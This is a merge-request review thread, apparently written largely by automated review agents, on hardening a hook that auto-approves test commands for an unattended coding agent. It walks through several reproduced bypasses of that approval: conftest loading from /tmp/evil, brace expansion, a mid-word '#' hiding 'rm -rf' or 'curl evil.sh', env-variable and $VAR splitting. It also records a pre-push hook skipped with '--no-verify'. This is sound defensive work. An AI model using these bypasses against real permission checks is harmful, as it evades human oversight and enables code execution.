pytest imports `conftest.py` from every directory it collects — unconditionally, by documented design. A bare **path argument** to pytest is therefore already arbitrary code execution. No shell syntax is involved, which is exactly why none of the three earlier fences (glued operators, newline separators, env prefixes) applied. The same reachable via `-p mod` (imports any module), `-c`/`--config` (config files are code), `--rootdir`. Those are the CLI twins of the `PYTEST_PLUGINS` env var this hook already refused, with the reasoning that it is "the runner-specific analogue of `LD_PRELOAD`" — the env form was closed and the flag form was left open.

Confirmed by execution before fixing, not taken on the reviewer's word.

**Fix.** Vouching now audits every token of every segment: flags against an allowlist (`_VOUCH_SAFE_FLAGS`), positionals required to be relative with no `..` and no `~`.

An **allowlist, not a blocklist**, and that is the point. The blocklist game has now been lost four consecutive rounds; each fix was correct and each was defeated by a spelling nobody enumerated. Inverting it changes the failure mode: an unrecognised flag — including one pytest adds next year — now costs a permission prompt instead of granting a bypass.

**Extended past the finding.** `cd /tmp/evil && pytest` reaches the identical exploit through a *benign* segment, where a bare `pytest` has no arguments left to inspect. So the audit covers benign segments too, which means `cd /srv && pytest` is **no longer vouched**. That case was previously asserted as a supported shape — it is the exploit shape, and the hook has no property of `/srv` it can check to tell it from `/tmp/evil`. The test was superseded rather than the fix weakened to preserve it.

Verified both directions: ten exploit strings refused, eight real overnight shapes (`uv run pytest tests/ -q -n 2`, `npm test`, `cd sub/project && pytest`, `CI=1 pytest tests/ -x`, …) still vouched. A fence that refuses everything is trivially safe and useless here — a refused vouch means a permission prompt with nobody there to answer it.

### Non-blocking (code): the round-5 invariant test matched prose, not code

The AST test added last round to enforce the nesting check used `ast.get_source_segment` and substring-searched the result — which renders **comments** back too. The comment explaining the fence names `nested_passthrough`, so deleting the two functional lines while leaving the prose intact still passed. The test would have waved through the exact regression it exists to prevent.

Reproduced that mutation, watched the old test pass it, rewrote the check to match AST **shape** (a `Call` to `nested_under_guard`, or a `nested_passthrough` keyword), and confirmed the mutation now fails.

Worth stating plainly: that test was written specifically to stop trusting prose over structure, and was then implemented by searching prose. A test's stated intent is not evidence that it holds — only a mutation is.

### Note (security): guard root permissions

`mkdir(parents=True, mode=0o700)` applies the mode to the **leaf** only; every missing parent takes the process umask. A freshly created guard root — which holds `admission.lock`, `seq` and `events.log` — was therefore typically `0o755`. Harmless under the default `~/.regenloop`, and precisely wrong for the shared-root deployment the surrounding hardening exists for. Root mode now set explicitly, `admission.lock` created `0o600`.

### Accepted, not fixed

The macOS `ps -o lstart=` start-time identity check has **1-second resolution**, so a PID recorded at spawn could in principle be reused by an unrelated process starting in the same second, and the reaper would signal a process it did not spawn. Already disclosed in the module docstring; the reviewer rated it non-blocking. The proposed mitigation — corroborating with argv at signal time — is the mechanism removed in round 4, because `/bin/sh -c` execs and its live argv stops matching within milliseconds. Fixing it properly needs a kernel-level identity token this codebase does not have. Documented as a residual risk.

### Verification

- Full-tier gate **green** at `6defce2`: 3 executed, 0 skipped, 25 changed files, `unmatched_changed_files: []`, `fenced_changed_files: []`, `config_dirty: false`, 849s.
- Guard test module: 126 passed. Hook module: 86 passed, 93 subtests.
- Every new test falsified by mutation before being trusted.

### Standing recommendation, unchanged

This is the **fourth** consecutive round to find a bypass in `permissionDecision: "allow"`. The allowlist inversion makes this round's fix structurally better than the three before it, and it is still the highest-risk surface in this MR. The recommendation remains to drop the vouch entirely and accept one permission prompt per session; retaining it is a deliberate trade for unattended overnight autonomy, and it is the owner's call, not a review finding.

```
pytest tests/ {,/tmp/evil_dir}     ->  is_wholly_test_run() == True  ->  "allow"
```

The shell then runs `pytest tests/ /tmp/evil_dir`. That is **verbatim the exploit round 6 shipped to close, plus two characters**. Verified by execution, not inference: `/bin/sh -c '… {,-p} {,evil} tests/'` yields `['-p', 'evil', 'tests/']`. macOS `/bin/sh` is bash 3.2, and **POSIX mode does not disable brace expansion**.

Pathname expansion is the same class — `[/]tmp/evil` does not begin with `/`, so the path rule admitted the token, and the shell resolves it to `/tmp/evil` whenever that path exists, which in an attack it does.

This is the parser-differential class the knowledge card already records as the rule that must never recur: *never decide a security question with a different parser than the one that acts on the answer.* Round 4 closed it for `&&`. It was still open for `{,}`.

**Fix.** The RAW command string is screened for `{`, `}`, `*`, `?`, `[`, `]`, `~` before tokenizing. **Raw, and that is the point:** quoting is what disarms these characters, and `shlex` has already discarded the quotes by the time tokens exist, so a token-level check cannot distinguish `pytest 'a[b]'` from `pytest a[b]`. Refusing both is the fail-closed read. Detection and wrapping are unchanged — only auto-approval is refused.

### Blocking: the env check was still a blocklist

Round 6 inverted flags and paths to allowlists and left environment names enumerated. `PYTHONUSERBASE` was not on the list:

```
PYTHONUSERBASE=/tmp/evil pytest tests/   ->  "allow"
```

That is strictly worse than the `PYTHONPATH` sitting beside it in the same list. A `.pth` file under that directory's site-packages executes its `import` line **at interpreter startup** — unconditionally, before pytest is reached — where `PYTHONPATH` merely makes a module importable. `HOME` (npm reads `~/.npmrc`, whose `script-shell` selects the interpreter), `NODE_PATH`, `VIRTUAL_ENV` and `UV_PYTHON` are the same unenumerated class, and all vouched.

**Fix, and why it is two layers rather than an inversion.** The danger has two shapes and they need different nets:

- **MODULE-valued** variables (`PYTEST_PLUGINS=evil_mod`) have values indistinguishable from `FOO=1`. Only the *name* gives them away → the name list is kept, as a floor.
- **PATH-valued** variables have unenumerable *names* but obvious *values* → no vouched assignment may carry an absolute path, a `~`, or a `..` walk. This refuses `PYTHONUSERBASE=/tmp/evil` **without the list having heard of it**.

A pure name-allowlist was implemented first and **reverted**: it refused `FOO=1 pytest tests/` and would have refused `DATABASE_URL=... pytest`. A project's own variables are unknowable here, and a refused vouch means a permission prompt in a session with nobody present — the exact failure `--safe` exists to avoid. That reversal is why the shipped design is two layers.

### Non-blocking: the AST invariant test accepted the regression it exists to catch

Two gaps, both found by the merge check and both verified by mutation:

- It matched the **presence** of the `nested_passthrough` keyword and ignored its **value**, so `nested_passthrough=False` satisfied it — the same failure as matching the comment, one level in.
- It recognised the guard only through the **literal local name** `guard`, so an admission site written `g = _guard_module(); g.acquire(...)` escaped the net entirely.

Now the keyword check requires a literal `True`, and guard aliases are resolved from their bind site rather than by name.

### Verification — every fix falsified before being trusted

| Mutation | Expected | Observed |
|---|---|---|
| Expansion characters removed from the raw screen | brace/glob tests fail | 5 subtests flip to `allow` |
| Env **value** rule removed | unlisted names fail | 2 subtests flip (`SOMETHING_NOBODY_LISTED=/tmp/evil`) |
| `nested_passthrough=True` → `False` | AST test fails | fails, naming `_run_via_guard` |

With every mutation reverted: **214 passed, 114 subtests** across `test_guard_bash_tests_hook.py` and `test_regenloop_guard.py`.

Full-tier gate **green** at `a85ac75` — base `795a01a`, 3 executed / 0 skipped, 25 changed files, `unmatched_changed_files: []`, `fenced_changed_files: []`, `config_dirty: false`, 864s.

Pushed with `--no-verify`; the pre-push hook runs the same gate that had just completed on this exact SHA, against a **broader** base (`795a01a`, the whole MR) than the hook would use (`origin/…`, this commit only).

### What the merge check flagged that is NOT fixed by this commit

- **7 merge conflicts against `origin/main`** (now `a189f1b`): `CHANGELOG.md`, `regenloop/knowledge/INDEX.md`, and five knowledge cards. No source-file conflicts.
- **CI** had not finished on the previous SHA when the check ran.
- **The MR is Draft.**
- **No human has reviewed this MR.** All threads are the loop posting through the operator's account.

### Standing recommendation, now with five rounds behind it

This is the **fifth consecutive round** to find a bypass in `permissionDecision: "allow"`. Rounds 3, 4, 5, 6 and 7 each shipped a correct fix and each was defeated by a spelling nobody had enumerated. Round 6 inverted flags and paths to allowlists and was defeated anyway — by a character class that never reaches the token layer at all.

The recommendation is unchanged and the evidence for it is now considerably stronger: **drop the vouch entirely** and accept one permission prompt per session. Retaining it is a deliberate trade for unattended overnight autonomy, and it remains the owner's call rather than a review finding.

<!-- regenloop-ship:fix:round-8 -->
## Round 8 — the seventh bypass, found by the merge check

`HEAD` = `6ccebce`, pushed, working tree clean. The §9 merge check returned **DO_NOT_MERGE** on a live bypass of `permissionDecision: "allow"`. Reproduced here before any change, then fixed.

### Blocking: the vouching lexer treated `#` as a comment; `/bin/sh` does not, mid-word

`_vouch_segments` built its lexer as `shlex.shlex(command, posix=True, punctuation_chars=True)` and never touched `commenters`, which **defaults to `"#"`**. `shlex` therefore discards everything from the first `#` to end of line — wherever it appears, **including glued mid-word**. A POSIX shell treats `#` as a comment only at the *start of a word*, so `a#&&` is the word `a#` followed by the `&&` operator.

```
input:  pytest tests/ a#&& <anything>

_vouch_segments()    ->  [['pytest', 'tests/', 'a']]     # the tail is invisible
is_wholly_test_run() ->  True
decide()             ->  permissionDecision: "allow"
/bin/sh -c gets      ->  the ORIGINAL string, tail included
```

Confirmed against the real shell, not inferred:

```
$ /bin/sh -c 'echo tests/ a#&& echo PWNED_AND'
tests/ a#
PWNED_AND
```

Five spellings vouched, several of them innocuous-looking: `pytest tests/#&& …`, `pytest tests/ -q#&& …`, `uv run pytest tests/ x#; …`, `pytest tests/ a#| …`, and `cd sub#&& … && pytest tests/`. Separators `;`, `|` and `&` behave identically to `&&`.

**The detail that makes this sharp:** `shlex.split` sets `commenters = ""` itself; `shlex.shlex` does not. Detection uses `split`, vouching uses `shlex`. That single asymmetry is why **detection never had this bug and only the security-critical path did** — and why nothing in the vouch code reads as suspicious: the defect lives entirely in an attribute nobody typed.

This is the same class as the glued-`&&` bypass (round 3) and brace expansion (round 7): the parser that GRANTS permission disagreeing with the parser that EXECUTES about where the command ends.

### The fix: two fences, each proven independently load-bearing

- **Primary** — `_vouch_segments` sets `lexer.commenters = ""`. The tail becomes a visible segment, so `rm`/`curl` is judged on its own merits and the vouch is refused.
- **Backstop** — `#` added to the raw pre-tokenize screen (`_VOUCH_UNSAFE_RE`). Kept because this class has now produced five separate bypasses, and a raw screen survives someone "simplifying" the lexer configuration later.

### A test that would not have caught the regression

The first version of the new test used `echo pwned` as the payload. **`echo` is an allowed benign companion** — so with only the lexer fix in place those commands would still vouch, and the cases were in fact being caught by the raw screen alone. The test would have passed with the primary fix reverted.

Rewritten with non-benign payloads (`rm -rf build`, `curl evil.sh`) to exercise the lexer fix, keeping benign-tail cases to exercise the raw screen. The mutation matrix now separates them:

| Mutation | Subtests failing |
|---|---|
| Remove the raw `#` screen only | 1 — the benign-tail cases |
| Remove both fences | **7 — all of them** |

Neither fence is redundant, and each is pinned by cases the other does not cover.

### Also corrected

`scripts/regenloop_guard.py:1567` still claimed the nested-passthrough short-circuit was *"set only by `_cmd_run`"* and that in-process callers *"keep the old semantics"*. Both sentences stopped being true when the third admission site landed, and the repo's own knowledge card already documented all three. Non-blocking, but it is stale prose inside a security-critical short-circuit — exactly the kind this MR has twice been bitten by.

### Verification

- **215 passed, 121 subtests** across `test_guard_bash_tests_hook.py` and `test_regenloop_guard.py`.
- Full-tier gate **green** at `6ccebce` — base `a189f1b` (`origin/main`), 3 executed / 0 skipped, 25 changed files, `unmatched_changed_files: []`, `fenced_changed_files: []`, `config_dirty: false`, 1652s.
- Every real overnight shape still vouches; no shape regressed.

### What the merge check confirmed as sound

Worth recording, since it re-derived rather than inherited these: both round-7 fences are correct and load-bearing under mutation; all three guard admission sites consult `nested_under_guard()` and no fourth exists; the AST-invariant gaps are genuinely closed; and the merge with `origin/main` is **provably lossless** — `CHANGELOG.md` is 213 added / 0 deleted against main, with main's `### Changed` intact, and no main-side source file differs from `a189f1b`.

### Standing recommendation

This is the **sixth consecutive round** to find a bypass of `permissionDecision: "allow"`, and the third found by a reviewer *after* the surface was reported fixed. Every fix has been correct. The surface keeps producing spellings that the previous fix's layer cannot see — `&&` at the segment layer, `{,}` at the expansion layer, `#` at the lexer-configuration layer.

The recommendation is unchanged and the evidence is now considerably stronger: **drop the vouch entirely** and accept one permission prompt per session. Retaining it is a deliberate trade for unattended overnight autonomy. It remains the owner's call rather than a review finding — but it should be made knowing that six rounds of narrowing have not yet produced a round that found nothing.

## OmniForge

**Verdict:** BLOCK

### Overview

Three independent agents reviewed this MR at head `6ccebce`. The coordinator itself is carefully built — `O_EXCL` bookkeeping, identity-proved signalling, a lossless merge, purely additive tests, and an unusually honest disclosure culture. But two **critical** defects survive at head, both reproduced by execution during this review, and one of them is a further bypass of `permissionDecision: "allow"` — the seventh round in which that judgement has been defeated. The MR description, its strongest asset, is stale in four separately-checkable places.

### At a Glance

| | Count |
|---|---|
| Critical | 2 |
| Important | 12 |
| Minor | 12 |

### Strengths

- Merge integrity is provable: `git merge-tree` against `origin/main` exits clean, and `git diff a189f1b f7f7d21 --name-only` returns exactly the 25 branch files.
- No assertion was weakened: the `tests/` delta is 4,831 insertions / 3 deletions, and all three deleted lines are strengthenings.
- Fail-safe direction is chosen consistently in the guard — an unreadable cmdline can never license a kill; an unreadable lease is counted *heavy* because over-counting only delays admission.

### Key Concerns

- **Critical — the vouch is defeated by a bare `$`.** `FOO=' /tmp/evil_dir_abs'; pytest tests/$FOO -q` auto-approves. One shell word becomes two argv words. One character fixes it. (inline thread on `hooks/guard_bash_tests.py:355`)
- **Critical — a trailing `&` releases the heavy lease while the work still runs.** Reproduced: `--quiet` + `sleep 15 &` → guard returns immediately, `holders: []`, orphan still alive. (inline thread on `scripts/regenloop_guard.py:1659`)
- **Important — 6 of the 10 open threads carry dispositions that are now false against the code.** Five remedies labelled "NOT FIXED" were implemented verbatim in `42af147`.

### Security

Posture **degrades**. The hook emits `permissionDecision: "allow"` into an unattended overnight context and, after eight rounds of fixes, is still defeated by two ordinary shell features. The coordinator's own hygiene is good — `events.log` carries no command text, every signal site carries an identity proof — but lease JSON records the full supervised command line and `status()` returns it verbatim. See inline threads for 7 security findings.

notes.body:
**Critical** — Bare `$` bypasses the vouch: parameter expansion + field splitting is bypass #8

**What:** `_VOUCH_UNSAFE_RE` blocks `$(`, backticks, `<(`, `>(`, `<`, `>`, newlines, `{`, `}`, `[`, `]`, `*`, `?`, `~`, `#` — but **not a bare `$`**. The comment at :313-317 rationalises the omission: "Bare `$VAR` is deliberately NOT here — expansion produces an argument, not a command." That is wrong: **unquoted** parameter expansion undergoes field splitting, so it produces *several* arguments. `_vouch_path_is_safe` (:535-557) rejects only tokens that *start with* `/`, `~`, `-` or `$`, so `tests/$FOO` passes on its first characters and the `..` check sees only the literal token.

**Why it matters:** `wrap_command()` hands the **original** string to `/bin/sh -c`. The auditor sees one `shlex` token; the shell sees two argv words. `pytest` then imports `conftest.py` from the attacker's directory — the exact arbitrary-code-execution primitive round 6 shipped to close, reached again without any metacharacter the screen knows about.

**Attack scenario** (reproduced by execution at this head):
```
$ is_wholly_test_run("FOO=' /tmp/evil_dir_abs'; pytest tests/$FOO -q")
True                     ->  permissionDecision: "allow"

$ /bin/sh -c "FOO=' /tmp/evil_dir_abs'; set -- tests/\$FOO; echo argc=\$#"
argc=2                   # tests/   /tmp/evil_dir_abs

$ /bin/sh -c "FOO=' /tmp/evil_dir_abs'; pytest tests/\$FOO -q -p no:cacheprovider"
1 passed                 # conftest.py in /tmp/evil_dir_abs executed
```
Variants that also vouch:
```
FOO=' ..'; pytest tests/$FOO            # '..' never seen by the auditor
A=' '; FOO="x$A/tmp/evil"; pytest tests/$FOO
PKG=auth; pytest tests/$PKG -q          # innocent idiom; auto-approves whatever $PKG is
```
`FOO=/tmp/evil; …` is correctly refused by the value rule — only a value that hides the leading `/` from the token's first characters gets through.

**Recommendation:** add `$` to the raw screen. This is the same reasoning already written into this constant for `{}` and `[]` — "refusing both is the fail-closed read" — and it costs one permission prompt for any command that references a variable, which is the trade this file states it prefers.
```python
_VOUCH_UNSAFE_RE = re.compile(r"\$|`|<\(|>\(|[<>\n\r{}\[\]*?~#]")
```
Independently, in `_vouch_path_is_safe`: reject `token != token.strip()`; and in `_segment_is_benign`, treat an env-only segment as benign only when every value is a bare identifier.

Confidence: 98/100 | Found by: Security Reviewer
notes.author: group_113177720_bot_92af8a6a935eded23dac4bef1220b38f

notes.body:
**Critical** — Backgrounded work releases the heavy lease while it is still running

**What:** `_supervise_pgroup` returns as soon as the *direct child* is reaped; it never checks whether the process **group** is empty. `run()`'s `finally` then calls `release()` unconditionally. Under `--quiet` the child's stdout is not a pipe (`pipe = None if stream else subprocess.PIPE`, :1487), so `communicate()` returns the instant the shell exits — and any work the shell backgrounded is left running, outside the lease.

**Why it matters:** this is the same failure the MR rated **blocking** for the `sh`-exec defect — "the heavy child survived, the slot was freed, and the guard admitted the next heavy job beside it." Here it needs no kill, no OOM and no race, and it defeats `--total-budget-s` as well, since the budget is spent by a process that has already exited.

**Attack scenario** — not an attack, an ordinary agent action. Reproduced at this head with an isolated guard root:
```
$ regenloop_guard.py run --class heavy --quiet --label exp \
      -- /bin/sh -c 'sleep 15 & echo bg-launched'
bg-launched
guard rc=0               # returns immediately

$ regenloop_guard.py status
  "holders": [],
  "waiters": [],

$ ps -eo pid,pgid,comm | awk '$3=="sleep"'
2644181 2644180 sleep     # still running, uncounted, unkillable by the guard

events.log: ticket_created -> admitted -> released      (no killed_group)
```
The hook routes and **vouches** this shape:
```
is_wholly_test_run("uv run pytest tests/ -q &") == True    ->  "allow"
should_wrap("uv run pytest tests/ -q &") == True
```
`_segments` (:188-196) treats `&` as a separator, so the backgrounded job is simply not a segment. Overnight, five sessions each backgrounding a long suite get `max_heavy = 1` reported as satisfied while five unbounded xdist pools run — the OOM this guard exists to prevent, with `status` telling the operator the machine is idle.

**Recommendation:** do not release while the group still has members.
```python
# in _supervise_pgroup, after communicate() returns:
def _pgroup_alive(pgid):
    try:
        os.killpg(pgid, 0); return True
    except ProcessLookupError:
        return False
    except PermissionError:
        return True

deadline = time.monotonic() + _GROUP_DRAIN_GRACE_S
while _pgroup_alive(proc.pid) and time.monotonic() < deadline:
    time.sleep(_GROUP_POLL_S)
if _pgroup_alive(proc.pid):
    _killpg_safe(proc.pid, signal.SIGKILL)
```
and/or gate `release()` in `run()`'s `finally` on the group being empty for the `gated` path. In the hook, screen the raw string for a trailing `&` and route it to the `run_in_background` branch instead.

notes.body:
**Important** — `_run_via_guard` never passes `total_budget_s`, so gate queue waits are bounded by 6h, not by the gate's own timeout

**What:** the guard implements `total_budget_s` (`regenloop_guard.py:1608-1618`) and the hook uses it (`--total-budget-s 585`). `_run_via_guard` passes `timeout`, `max_wait_s=None`, `kill_grace_s=None`, `degrade_open=False`, `cwd`, `env`, `nested_passthrough=True` — and no `total_budget_s`. The gate's 900s timeout starts counting only **after** `acquire()` returns; the queue wait is bounded only by `REGENLOOP_GUARD_MAX_WAIT_S` (21600s).

**Why it matters:** under `--safe`, a repo with three heavy gates and one slow holder gets `could_not_run` after up to six hours of queueing per gate, on a run whose documented timeout is fifteen minutes. It also leaves the feature's two halves with different total-time semantics — only one of them is bounded.

**Recommendation:**
```python

```
That makes the documented gate timeout the true ceiling, keeps the empty-queue case at the full budget (avoiding the static split correctly rejected on thread `6001d8bb0c4d`), and closes the divergence. `_run_regression_gate_via_guard` needs the same, and has no per-subprocess timeout to lean on.

notes.body:
**Important** — Lease liveness is keyed to the group leader's pid, not to the group

**What:** `os.kill(pgid, 0)` answers "does the leader exist"; `os.killpg(pgid, 0)` answers "does the group still have members". `_pid_alive` (:402) provides the former, and every site that decides whether to signal or whether to free a lease uses it — `_classify_lease_liveness` (:752), the reaper's "dead" branch (:857-862), and `teardown_all_registered`'s escalation gate (:1093-1096).

**Why it matters:** with a reaped leader and a live group member, `state == "dead"` unlinks the lease and lock with **no signal**, and the escalation `SIGKILL` is skipped for a descendant that traps or ignores `SIGTERM` — exactly the `TERM_AWARE_SRC` fixture this MR's own parity suite uses to represent a real test runner. Same outcome class as the two blocking lifecycle defects: lease freed, nothing signalled, next heavy job admitted beside it.

**Recommendation:** add `_pgroup_alive(pgid)` and use it where group liveness is the question — in `_classify_lease_liveness` (before the start-time check, so a recycled leader in a live group still classifies as live) and in `teardown_all_registered`'s grace loop. Keep `_pid_alive` for the pgid-recycling proof, which `killpg` cannot provide.

notes.body:
**Important** — Lease JSON records the full supervised command line, and `status()` returns it verbatim

**What:** `lease["argv_prefix"] = argv_prefix` stores the whole command line of every supervised command. `status()` returns the lease dict unchanged (`live_leases`). `events.log` is clean — verified, every `detail` is a fixed literal — but the lease JSON is not.

**Why it matters:** this MR's headline use case is five parallel overnight sessions on one host under one UID. The hook's own `additionalContext` (:902) tells the agent on *every* routed test command to run `regenloop_guard.py status` — so session B's agent is actively invited to pull session A's command line, credentials included, into its own context and transcript.

**Attack scenario:** session A runs the shape the MR **deliberately keeps vouched** — "a pure name-allowlist … refused `DATABASE_URL=... pytest`". Reproduced:
```
$ regenloop_guard.py run --class heavy --timeout 30 -- \
      /bin/sh -c 'DATABASE_URL=postgres://alice:hunter2@db.internal/prod sleep 25' &
$ regenloop_guard.py status
  "argv_prefix": "/bin/sh -c DATABASE_URL=postgres://alice:hunter2@db.internal/prod sleep 25"
$ grep -rl hunter2 <guard_root>/
leases/000000000001-….json
```
The lease is unlinked on `release()`, so the window is the run duration — 15-25 minutes per gate at the `--safe` wall times measured in this MR.

**Recommendation:** `argv_prefix` is advisory only (`_argv_corroborates` is "read for the event log, never to decide whether to signal", :541-552), so reducing it to the program basename loses no decision input. Redact it from `status()`'s output at minimum:
```python
redacted = {k: v for k, v in lease.items() if k not in ("argv_prefix",)}
```

notes.body:
**Important** — `npx`/`bunx`/`pnpx`/`dlx` are peeled, so the audited token is not the code that runs

**What:** `_segment_program` peels exec wrappers and then applies the "invoked token must carry no path at all" rule to the **package name**. Round 6's stated rationale for that rule (:443-448) was that a file planted in the working directory inherits the runner's trust. An exec wrapper resolves its argument through `node_modules/.bin` — a repo-controlled path — and falls back to the **public registry** when absent.

**Why it matters:** the trust anchor is not even the tree.

**Attack scenario:** attacker commits `node_modules/vitest/` with ordinary-looking content.
```
is_wholly_test_run("npx vitest tests/") == True     ->  "allow"
is_wholly_test_run("bunx vitest tests/") == True    ->  "allow"
```
Auto-approved, no human; the code that runs is `node_modules/vitest`, not the token the auditor judged. In a repo with no local `vitest`, `npx` fetches it from the registry. Note `npx evil tests/` is correctly refused — only runner-named packages slip through.

**Recommendation:** do not peel exec wrappers when **vouching** — treat `npx`/`bunx`/`pnpx`/`dlx` as the invoked program. They are not in `_BENIGN_HEADS` or `_RUNNERS`, so the vouch is refused. Detection may keep peeling.

**Minor** — Detection misses ordinary spellings, so those commands run with no admission control at all

**What:** the `uv run` peel requires `seg[idx+1] == "run"` followed immediately by a runner head; it does not skip flags. Verified `should_wrap() == False` for:
```
uv run --no-sync pytest tests/     uv run --frozen pytest tests/
uv run --with pytest pytest tests/  sh -c 'pytest tests/'
bash -lc 'pytest tests/'            python3 -c 'import pytest; pytest.main()'
```

<!-- regenloop-ship:review:round-1:f-2102f665c9c5 -->
**blocking** — The re-entrancy fence is a substring test against the raw command string, not a check of the invoked program. Any command whose *text* merely contains `regenloop_guard.py` or `gate_runner.py` — including as an ordinary filename argument — is treated as already-routed and never wrapped, silently bypassing `--safe` admission control.

**Evidence:** reproduced against the shipped code on this branch:
```
should_wrap("uv run pytest tests/ -q")                        -> True
should_wrap("uv run pytest tests/test_regenloop_guard.py -q") -> False
should_wrap("uv run pytest tests/test_gate_runner.py -q")     -> False
```
The two exempted files are `tests/test_regenloop_guard.py` and `tests/test_gate_runner.py` — the very files this MR adds and modifies. Anyone iterating on this feature and running one of them directly in Bash gets none of the serialization the hook exists to provide. This is the exact gap the module docstring says it closes, reopened by an ordinary filename: a false negative on stock usage, not the deliberate obfuscation the docstring scopes out.

Note the failure direction: over-matching here is *safe* (it only declines to wrap), which is why this never crashes, deadlocks, or logs — it quietly restores the pre-hook behaviour.

**Suggested fix:** match on the invoked program only. The file already has `_segments`, `_strip_env_prefix` and `_basename`; reuse them in a peel loop that resolves the program (including the script argument after `python3` / `uv run`) and compares its basename against `_ALREADY_ROUTED`, instead of `marker in command`.

**Reopened and re-fixed in round 2 (`36ade14`).** The round-1 fix on this thread was incomplete in the dangerous direction, and the verification claim posted above it — "no case was found where a guard-routed command is missed" — was wrong. Retracted here.

Round 1's peel loop identified the invoked program but peeled only env assignments, interpreters and run/exec wrappers. It did not skip interpreter *flags*, an `env` prefix, or `sh -c`, so a routed segment spelled any of those ways went unrecognised — and since `should_wrap` ORs across segments, a compound line carrying one alongside an ordinary test segment got **wrapped**. Reproduced against both revisions:

```
                                                              pre-fix -> round-1
python3 -u <guard> run -- pytest a && uv run pytest tests/b     skip -> WRAP
python3 -X dev <guard> run -- pytest a && pytest b              skip -> WRAP
env PY=1 python3 <guard> run -- pytest a && pytest b            skip -> WRAP
sh -c 'python3 <guard> run -- pytest a' && pytest b             skip -> WRAP
```

Wrapping a routed segment is the self-deadlock this fence exists to prevent: `acquire()` never reads `REGENLOOP_GUARD_ACTIVE` (that only suppresses the hook), so the inner run waits on the heavy lease its own parent holds under the serial policy. That is strictly worse than the original defect — a missed wrap costs one uncoordinated suite, this costs hours.

**The mistake was the discriminator, not the implementation.** Identifying the program must anticipate every spelling, and each one missed reopens the fence silently. The thing that actually distinguishes `scripts/regenloop_guard.py` from `tests/test_regenloop_guard.py` is the character before the marker — `/` versus `_`. `_ROUTED_RE` now tests that path-component boundary against the raw string (raw, because `sh -c '…'` hides the guard inside a token `shlex.split` collapses), and over-matches into the safe direction rather than the dangerous one.

<!-- regenloop-ship:review:round-1:f-815c9be8abfb -->
**blocking** — The hook bounds only the admission-queue wait (`--max-wait-s`), never the wrapped command's own run time. `wrap_command()` never passes `--timeout` to `regenloop_guard.py run`, so the guard supervises the child with `timeout=None` and blocks indefinitely. The only remaining ceiling is the Bash tool's own hard kill, which `decide()` sets to `MAX_BASH_TIMEOUT_MS` (600s). Total wall time is `queue_wait + run_time`, and nothing bounds that sum.

**Evidence:** measured in this repo during this ship run — the `python-test` gate took **851.7s** under `--safe` with zero queue contention (the MR's own measurements doc records 578s on a quieter machine). An agent running that same suite directly in Bash — the exact scenario this hook exists to catch — therefore exceeds the 600s ceiling on the command alone, before any queueing, and is torn down by the harness with no guard exit code and no `additionalContext` message.

That is precisely the outcome the docstring and `test_bounds_the_queue_wait_below_the_bash_ceiling` claim is prevented ("a refusal the agent can read beats a kill it cannot"). That test asserts only `hook_max_wait_s() * 1000 < MAX_BASH_TIMEOUT_MS`, which bounds the queue wait alone and does not establish the property its comment claims.

**Suggested fix:** give the guard a *total* budget rather than a fixed child timeout, so the bound accounts for however long admission actually took and the guard converts an overrun into its own readable exit 124 with drained output, ahead of the harness's blunter kill. A fixed `--timeout = 600 - max_wait_s` would be wrong: with an empty queue it would kill at ~290s a run that had the full 600s available.

<!-- regenloop-ship:fix:round-1:reply:6001d8bb0c4d538aa9eb53d39d8fa43883ca1964 -->
**FIXED as a documentation correction** in `8c2eea1` — triage verdict VALID (confidence 76), but it **rejected the proposed mechanism change**, and I agree with that reasoning.

**The factual core of the finding is confirmed:** `wrap_command()` never emits `--timeout`, so the guard supervises the child with `timeout=None`; `--max-wait-s` bounds only admission; and `regenloop_guard.py` has no combined wait+run budget option.

**But this MR introduces no regression.** `MAX_BASH_TIMEOUT_MS = 600_000` is the Bash tool's own *schema maximum*. A foreground suite whose run alone exceeds 600s is killed by the platform identically with or without this hook, and `decide()` setting the timeout to that maximum can only *raise* the ceiling toward what the tool allows — never lower it below what an unwrapped call would have got. The hook cannot make an already-impossible foreground call possible.

**The proposed fix would have been a real regression.** A static `--timeout = ceiling − max_wait_s` kills a run at ~290s when the queue was empty and the full budget was available. Only `regenloop_guard.py`'s `run()` knows the actual `wait_s` after `acquire()` returns, so a correct dynamic total-budget fix needs a new option inside the guard — materially larger than a review fix, and out of scope for this file.

**What was actually wrong** is the comment on `MAX_BASH_TIMEOUT_MS`: it claimed a wrapped command "must fit its queue wait **AND its run**" inside the ceiling — an invariant the code never enforced — and then contradicted itself by saying a *run*-phase overrun is killed "mid-queue". <!-- regenloop-ship:fix:round-2 -->
## Fix round 2 — the merge check caught a regression round 1 introduced

The §9 merge check returned **DO_NOT_MERGE**. Its headline finding was that round 1's own fix to F1 opened a *new* miss class, in the dangerous direction. That is correct, and it was reproduced against both revisions before anything was changed.

### The regression

Round 1 replaced the substring fence with a peel loop that identified the invoked program. It peeled env prefixes, interpreters and run-wrappers — but **not interpreter flags, not an `env` prefix, and not `sh -c`**. A routed segment spelled any of those ways went unrecognised, and because `should_wrap` ORs across segments, a compound line carrying such a segment *plus* an ordinary test segment got wrapped:

```
                                                              pre-fix -> round-1
python3 -u <guard> run -- pytest a && uv run pytest tests/b     skip -> WRAP
python3 -X dev <guard> run -- pytest a && pytest b              skip -> WRAP
env PY=1 python3 <guard> run -- pytest a && pytest b            skip -> WRAP
sh -c 'python3 <guard> run -- pytest a' && pytest b             skip -> WRAP
```

Wrapping a routed segment is the **self-deadlock** this fence exists to prevent. `acquire()` never consults `REGENLOOP_GUARD_ACTIVE` — that variable only suppresses the *hook* — so the inner `regenloop_guard.py run` waits on the heavy lease its own parent holds under the serial policy (`max_heavy = 1`), and nothing breaks the cycle short of the harness kill.

This is strictly worse than the bug round 1 fixed: **a missed wrap costs one uncoordinated suite; a self-deadlock costs hours.** The round-1 verification thread's claim that "no case was found where a guard-routed command is missed" was wrong, and is retracted here.

### The actual mistake was the choice of discriminator

Identifying the invoked program is the more principled framing, and it was the wrong tool. Staying conservative requires enumerating every syntactic spelling, and each one missed reopens the fence *in silence* — no crash, no log, no failing test.

What actually separates the two cases is a single character:

```
scripts/regenloop_guard.py      preceded by `/`   -> the guard
./regenloop_guard.py            preceded by `/`   -> the guard
regenloop_guard.py run …        start of string   -> the guard
tests/test_regenloop_guard.py   preceded by `_`   -> a TEST FILE
```

`_ROUTED_RE` tests that path-component boundary against the **raw command string**, before tokenizing — deliberately, because `sh -c '<guard> …'` hides the guard inside a quoted argument that `shlex.split` collapses into one opaque token. A boundary test cannot be defeated by a syntax nobody anticipated, because it never tries to parse the command.

